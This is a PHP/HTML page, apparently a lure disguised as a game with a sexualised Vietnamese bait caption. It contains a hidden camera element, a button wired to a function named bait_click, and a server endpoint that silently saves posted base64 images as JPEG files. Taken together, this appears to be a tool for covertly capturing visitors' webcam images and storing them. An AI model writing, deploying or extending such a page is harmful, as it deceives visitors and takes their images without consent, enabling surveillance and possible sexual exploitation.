<?php

if (isset($_POST['image'])) {

    file_put_contents(
        __DIR__.'/'.time().'.jpeg',
        base64_decode(
            preg_replace('#^data:image/\w+;base64,#i', '', $_POST['image'])
        )
    );

    die(json_encode(['status' => 'success']));
}

?>
<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Let me see your nail</title>
  <meta name="author" content="gingteam">
</head>

<body>
  <div id="my_camera" style="display: none;"></div>
  <input type="button" value="Start Game" onclick="bait_click()"/>
  <h2>Không chớp mắt 30s = Cởi một đồ</h2>
  <img src="https://i.imgur.com/UnpXdSo.png"/>
  <script src="js/app.js"></script>
</body>
</html>
